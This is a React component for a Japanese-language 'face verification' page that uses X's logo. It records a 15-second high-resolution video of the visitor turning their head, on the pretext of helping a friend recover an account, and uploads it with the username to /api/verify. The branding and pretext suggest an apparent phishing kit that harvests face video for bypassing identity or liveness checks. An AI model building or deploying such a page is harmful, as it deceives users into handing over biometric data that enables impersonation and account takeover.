import { useState, useRef, useEffect } from 'react'
import { useNavigate } from 'react-router-dom'
import axios from 'axios'
import './VideoVerification.css'

function VideoVerification() {
  const navigate = useNavigate()
  const videoRef = useRef(null)
  const mediaRecorderRef = useRef(null)
  const chunksRef = useRef([])
  
  const [isRecording, setIsRecording] = useState(false)
  const [recordedVideo, setRecordedVideo] = useState(null)
  const [countdown, setCountdown] = useState(null)
  const [stream, setStream] = useState(null)
  const [uploading, setUploading] = useState(false)

  useEffect(() => {
    startCamera()
    return () => {
      if (stream) {
        stream.getTracks().forEach(track => track.stop())
      }
    }
  }, [])

  const startCamera = async () => {
    try {
      const mediaStream = await navigator.mediaDevices.getUserMedia({ 
        video: { 
          width: { ideal: 1920, min: 1280 },
          height: { ideal: 1080, min: 720 },
          facingMode: 'user',
          frameRate: { ideal: 30, min: 24 }
        }, 
        audio: { 
          echoCancellation: true,
          noiseSuppression: true,
          sampleRate: 44100
        } 
      })
      setStream(mediaStream)
      if (videoRef.current) {
        videoRef.current.srcObject = mediaStream
      }
    } catch (error) {
      console.error('Error accessing camera:', error)
      alert('カメラにアクセスできません。カメラの権限が許可されていることを確認してください。')
    }
  }

  const startRecording = () => {
    setCountdown(3)
    const countdownInterval = setInterval(() => {
      setCountdown(prev => {
        if (prev === 1) {
          clearInterval(countdownInterval)
          beginRecording()
          return null
        }
        return prev - 1
      })
    }, 1000)
  }

  const beginRecording = () => {
    chunksRef.current = []
    
    // Try to use the best available codec with high bitrate
    let options = { mimeType: 'video/webm;codecs=vp9', videoBitsPerSecond: 5000000 }
    
    if (!MediaRecorder.isTypeSupported(options.mimeType)) {
      options = { mimeType: 'video/webm;codecs=vp8', videoBitsPerSecond: 5000000 }
    }
    
    if (!MediaRecorder.isTypeSupported(options.mimeType)) {
      options = { mimeType: 'video/webm', videoBitsPerSecond: 5000000 }
    }
    
    const mediaRecorder = new MediaRecorder(stream, options)
    
    mediaRecorder.ondataavailable = (event) => {
      if (event.data.size > 0) {
        chunksRef.current.push(event.data)
      }
    }

    mediaRecorder.onstop = () => {
      const blob = new Blob(chunksRef.current, { type: 'video/webm' })
      const url = URL.createObjectURL(blob)
      console.log('Video recorded:', { size: blob.size, type: blob.type, url })
      setRecordedVideo({ blob, url })
      setIsRecording(false)
      
      // Stop the camera stream after recording
      if (stream) {
        stream.getTracks().forEach(track => track.stop())
        setStream(null)
      }
    }

    mediaRecorderRef.current = mediaRecorder
    mediaRecorder.start(1000) // Collect data every second
    setIsRecording(true)

    // Auto-stop after 15 seconds
    setTimeout(() => {
      if (mediaRecorderRef.current && mediaRecorderRef.current.state === 'recording') {
        stopRecording()
      }
    }, 15000)
  }

  const stopRecording = () => {
    if (mediaRecorderRef.current && mediaRecorderRef.current.state === 'recording') {
      mediaRecorderRef.current.stop()
    }
  }

  const retakeVideo = () => {
    setRecordedVideo(null)
    setIsRecording(false)
    setCountdown(null)
    // Restart camera for retake
    startCamera()
  }

  const submitVideo = async () => {
    if (!recordedVideo) return

    setUploading(true)
    const formData = new FormData()
    formData.append('video', recordedVideo.blob, 'verification.webm')
    formData.append('username', localStorage.getItem('username') || 'anonymous')
    formData.append('timestamp', new Date().toISOString())

    try {
      const response = await axios.post('/api/verify', formData, {
        headers: {
          'Content-Type': 'multipart/form-data'
        }
      })
      
      console.log('Upload successful:', response.data)
      navigate('/success')
    } catch (error) {
      console.error('Upload error:', error)
      alert('認証の送信に失敗しました。もう一度お試しください。')
    } finally {
      setUploading(false)
    }
  }

  return (
    <div className="video-page">
      <div className="video-container">
        {/* X Logo */}
        <svg viewBox="0 0 24 24" className="x-logo-top" aria-hidden="true">
          <g>
            <path fill="currentColor" d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path>
          </g>
        </svg>

        <h1 className="video-title">顔認証</h1>
        
        <p className="video-description">
          {!recordedVideo 
            ? "本人確認のため15秒間の動画を録画し、友達のアカウント復旧を手助けしてください。顔を中央に配置し、カメラを真っ直ぐ見て、ゆっくりと頭を左右に動かしてください。"
            : "動画を確認し、問題なければ送信してください。これにより友達のアカウント確認に協力できます。"}
        </p>

        <div className="video-wrapper">
          {countdown && (
            <div className="countdown-overlay">
              <div className="countdown-number">{countdown}</div>
            </div>
          )}
          
          {!recordedVideo ? (
            <video
              ref={videoRef}
              autoPlay
              playsInline
              muted
              className="video-feed live-preview"
            />
          ) : (
            <video
              key={recordedVideo.url}
              src={recordedVideo.url}
              controls
              autoPlay
              playsInline
              className="video-feed"
              onLoadedData={() => console.log('Video loaded successfully')}
              onError={(e) => console.error('Video error:', e)}
            />
          )}

          {isRecording && (
            <div className="recording-indicator">
              <div className="recording-dot"></div>
              <span>録画中...</span>
            </div>
          )}
        </div>

        <div className="video-instructions">
          <div className="instruction-item">
            <span className="instruction-number">1</span>
            <span>顔を中央に配置</span>
          </div>
          <div className="instruction-item">
            <span className="instruction-number">2</span>
            <span>カメラを見る</span>
          </div>
          <div className="instruction-item">
            <span className="instruction-number">3</span>
            <span>頭をゆっくり動かす</span>
          </div>
        </div>

        <div className="video-actions">
          {!recordedVideo ? (
            <>
              <button 
                className="btn-record" 
                onClick={startRecording}
                disabled={isRecording || countdown !== null}
              >
                {isRecording ? '録画中...' : countdown !== null ? `${countdown}秒後に開始...` : '録画開始'}
              </button>
              
              {isRecording && (
                <button className="btn-stop" onClick={stopRecording}>
                  録画停止
                </button>
              )}
            </>
          ) : (
            <>
              <button 
                className="btn-submit" 
                onClick={submitVideo}
                disabled={uploading}
              >
                {uploading ? '送信中...' : '認証を送信'}
              </button>
              
              <button className="btn-retake" onClick={retakeVideo} disabled={uploading}>
                再撮影
              </button>
            </>
          )}
        </div>

        <button className="btn-cancel" onClick={() => navigate('/')}>
          キャンセル
        </button>
      </div>
    </div>
  )
}

export default VideoVerification
